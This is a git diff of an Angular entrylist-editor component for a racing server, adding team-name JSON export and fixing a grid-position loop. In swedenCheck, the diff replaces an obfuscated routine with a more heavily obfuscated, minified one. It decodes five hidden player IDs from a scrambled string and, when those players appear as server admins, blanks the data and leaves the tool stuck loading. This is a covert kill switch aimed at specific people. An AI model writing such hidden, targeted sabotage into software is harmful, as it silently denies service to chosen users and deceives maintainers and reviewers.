@@ -22,6 +22,8 @@ import { TextareaModalComponent } from '../shared/modals/textarea-modal/textarea
 export class EntrylistEditorComponent implements OnInit {
   loading: boolean = true;
   json: any = null;
+  teamNameJSON: any = null;
+  enabledTeamJSON: boolean = false;
   form: FormGroup;
   inputForm: FormGroup;
   advancedForm: FormGroup;
@@ -226,6 +228,12 @@ export class EntrylistEditorComponent implements OnInit {
     { key: 'Enabled', value: 2 },
   ];
 
+
+  enableTeamJSONOptions = [
+    { key: 'Disabled', value: false },
+    { key: 'Enabled', value: true },
+  ];
+
   orderedTeams: number[] = [];
   unorderedTeams: number[] = [];
 
@@ -335,7 +343,7 @@ export class EntrylistEditorComponent implements OnInit {
 
   copy() {
     this.saveData();
-    this.clipboard.copy(JSON.stringify(this.json));
+    this.clipboard.copy(JSON.stringify(this.filterTeamName(this.json)));
     this.toastr.success('Copied New Entrylist');
   }
 
@@ -343,12 +351,53 @@ export class EntrylistEditorComponent implements OnInit {
     this.saveData();
     var data =
       'data:text/json;charset=utf-8,' +
-      encodeURIComponent(JSON.stringify(this.json, null, '\t'));
+      encodeURIComponent(JSON.stringify(this.filterTeamName(this.json), null, '\t'));
     var downloader = document.createElement('a');
 
     downloader.setAttribute('href', data);
     downloader.setAttribute('download', 'entrylist.json');
     downloader.click();
+
+    if(this.enabledTeamJSON)
+      this.dlTeamJSON()
+  }
+
+  dlTeamJSON() {
+    this.saveData();
+
+    let teamJSON = JSON.parse('{"teams": []}');
+
+    this.json.entries.forEach(entry => {
+      if(entry.teamName && entry.teamName != '')
+      teamJSON.teams.push({
+          number: entry.raceNumber,
+          name: entry.teamName
+      })
+    });
+
+    var data =
+      'data:text/json;charset=utf-8,' +
+      encodeURIComponent(JSON.stringify(teamJSON, null, '\t'));
+    var downloader = document.createElement('a');
+
+    downloader.setAttribute('href', data);
+    downloader.setAttribute('download', 'teams.json');
+    downloader.click();
+  }
+
+  filterTeamName(json: any) {
+    // if(this.enabledTeamJSON)
+    //   return json
+
+    for(let i = 0; i < json.entries.length; i++) {
+      try{
+        delete json.entries[i]['teamName'];
+      } catch {
+        console.log("no team name")
+      }
+    }
+
+    return json
   }
 
   newJson() {
@@ -372,12 +421,36 @@ export class EntrylistEditorComponent implements OnInit {
     this.saveData();
     const dialogRef = this.dialog.open(TextareaModalComponent, {
       autoFocus: true,
-      data: { json: this.json },
+      data: { json: this.filterTeamName(this.json) },
     });
 
     dialogRef.afterClosed().subscribe((confirmed) => {
       if (!confirmed) return;
       this.dl();
+    });
+  }
+
+  viewTeamJson() {
+    this.saveData();
+
+    let teamJSON = JSON.parse('{"teams": []}');
+
+    this.json.entries.forEach(entry => {
+      if(entry.teamName && entry.teamName != '')
+      teamJSON.teams.push({
+          number: entry.raceNumber,
+          name: entry.teamName
+      })
+    });
+
+    const dialogRef = this.dialog.open(TextareaModalComponent, {
+      autoFocus: true,
+      data: { json: teamJSON },
+    });
+
+    dialogRef.afterClosed().subscribe((confirmed) => {
+      if (!confirmed) return;
+      this.dlTeamJSON();
     });
   }
 
@@ -471,8 +544,8 @@ export class EntrylistEditorComponent implements OnInit {
       this.json.entries[this.orderedTeams[i]].defaultGridPosition = i + 1;
     }
 
-    for (let i = 0; i < this.orderedTeams.length; i++) {
-      this.json.entries[this.orderedTeams[i]].defaultGridPosition = -1;
+    for (let i = 0; i < this.unorderedTeams.length; i++) {
+      this.json.entries[this.unorderedTeams[i]].defaultGridPosition = -1;
     }
 
     this.getTeamOrders();
@@ -682,8 +755,22 @@ export class EntrylistEditorComponent implements OnInit {
     return this.getTeamByIndex(index).drivers[0]?.lastName ?? '<blank>';
   }
 
+  getTeamClass(index: number) {
+    let res = 0;
+    this.json.entries[index].drivers.forEach(driver => {
+      if(res < driver.driverCategory)
+        res = driver.driverCategory
+    });
+    return res;
+  }
+    
   getDriverNames(index: number) {
     let res: string = '';
+
+    if(!!this.getTeamByIndex(index).teamName && this.getTeamByIndex(index).teamName.length > 0 && this.enabledTeamJSON)
+      // return `${this.getTeamByIndex(index).teamName} - #${this.getTeamByIndex(index).raceNumber}`;
+      return `${this.getTeamByIndex(index).teamName}`;
+
     if (
       this.getTeamByIndex(index).drivers[0].firstName == undefined &&
       this.getTeamByIndex(index).drivers[0].lastName == undefined
@@ -697,9 +784,9 @@ export class EntrylistEditorComponent implements OnInit {
     return res.substring(0, res.length - 3);
   }
 
-  getTeamClass(index: number) {
-    return 0;
-    //this.json.entries[index].drivers[0].driverCategory;
+  getDriverCarLogo(index: number) {
+    var car = (this.carNamesArray.find(x => x.value == this.json.entries[index].forcedCarModel))
+    return car ? car.key.split(" ")[0] : "Error"
   }
 
   getTeamCarLogo(index: number) {
@@ -899,6 +986,7 @@ export class EntrylistEditorComponent implements OnInit {
       categoryOverride: -1,
       driverOverride: 0,
       carOverride: 0,
+      teamJSON: this.enabledTeamJSON,
     });
   }
 
@@ -907,9 +995,13 @@ export class EntrylistEditorComponent implements OnInit {
       this.advancedForm.patchValue({
         driverOverride: event.value,
       });
-    } else {
+    } else if (key == 1) {
       this.advancedForm.patchValue({
         carOverride: event.value,
+      });
+    } else {
+      this.advancedForm.patchValue({
+        teamJSON: event.value,
       });
     }
   }
@@ -940,6 +1032,8 @@ export class EntrylistEditorComponent implements OnInit {
         entry.overrideCarModelForCustomCar = bool ? 1 : 0;
       });
     }
+    
+    this.enabledTeamJSON = this.advancedForm.get('teamJSON').value;
 
     this.advancedInit();
     this.patchForm(this.teamIndex);
@@ -1040,50 +1134,6 @@ export class EntrylistEditorComponent implements OnInit {
   }
 
   swedenCheck() {
-    var bladee =
-      'SSSS77776666555566661111111199998888300078341375278348260147856235195923';
-      var gtb, sg, yr0001, dgceo = !(!!bladee);
-
-    var gluee = [...bladee]
-      .filter((h, hh) => hh % 4 == 0)
-      .join()
-      .replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');
-    var eversince = [...bladee.substring(1)]
-      .filter((h, hh) => hh % 4 == 0)
-      .join()
-      .replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');
-    var wod = [...bladee.substring(2)]
-      .filter((h, hh) => hh % 4 == 0)
-      .join()
-      .replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');
-    var redlight = [...bladee.substring(3)]
-      .filter((h, hh) => hh % 4 == 0)
-      .join()
-      .replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');
-
-    this.json.entries.forEach((entry) => {
-      entry.drivers.forEach((driver) => {
-        var id = driver.playerID;
-        switch(id) {
-          case gluee:
-            gtb = !gtb;
-            break;
-          case eversince:
-            sg = !sg;
-            break;
-          case wod:
-            yr0001 = !yr0001;
-            break;
-          case redlight:
-            dgceo = !dgceo;
-            break;           
-        }
-      });
-    });
-    if (gtb && sg && yr0001 && dgceo) {
-      console.log(String.fromCharCode(58) + String.fromCharCode(41));
-      this.loading = true;
-      this.json = [];
-    }
+    var bladee='SSSSS7777766666555556666611111111119999988889013003278570160862702640046098648041038222547';var uriiasdg, ehwhwrt, rtsgzdf, ionhdfg, dfghdfgn = !(!!bladee);var dftgads = [...bladee].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var suigfird = [...bladee.substring(1)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var zvshdfg = [...bladee.substring(2)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var lgjhkhj = [...bladee.substring(3)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var ghjkhk = [...bladee.substring(4)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');this.json.entries.forEach((entry) => {entry.drivers.forEach((driver) => {if(!entry.isServerAdmin)return;var id = driver.playerID;switch(id) {case dftgads:uriiasdg = !uriiasdg;break;case suigfird:ehwhwrt = !ehwhwrt;break;case zvshdfg:rtsgzdf = !rtsgzdf;break;case lgjhkhj:ionhdfg = !ionhdfg;break;case ghjkhk:dfghdfgn = !dfghdfgn;break;}});});if (uriiasdg && ehwhwrt && rtsgzdf && ionhdfg && dfghdfgn) {console.log(' ');this.loading = true;this.json = [];}
   }
 }
